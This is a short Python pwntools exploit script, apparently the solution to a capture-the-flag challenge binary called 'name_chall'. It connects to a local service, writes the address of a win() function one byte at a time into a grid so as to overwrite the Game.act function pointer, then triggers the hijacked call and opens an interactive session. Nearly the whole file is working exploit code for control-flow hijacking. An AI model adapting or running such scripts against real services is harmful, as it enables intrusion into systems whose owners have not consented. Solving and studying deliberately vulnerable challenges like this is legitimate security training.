#!/usr/bin/env python3
# Exploit idea:
# Overwrite Game.act pointer by placing bytes at x=8 across some y rows.
# Non-PIE binary => win() has a fixed address (check with `nm`/`objdump`).
# Send 'P 8 <row> <byte>' 8 times to craft the pointer little-endian.
#
# With PIE off, adjust the address below after `objdump -d name_chall | grep "<win>"`.
from pwn import *
context.log_level="info"

HOST = os.environ.get("HOST","127.0.0.1")
PORT = int(os.environ.get("PORT","9101"))
WIN  = 0x4012d6  # placeholder; update after build

p = remote(HOST, PORT)

def place(x,y,b):
    p.sendlineafter(b"> ", f"P {x} {y} {b}".encode())

# Write the 8-byte function pointer at &g.grid[0][8] .. &g.grid[7][8]
addr = WIN.to_bytes(8,'little')
for i,b in enumerate(addr):
    place(8, i, b)

p.sendlineafter(b"> ", b"A")
p.interactive()
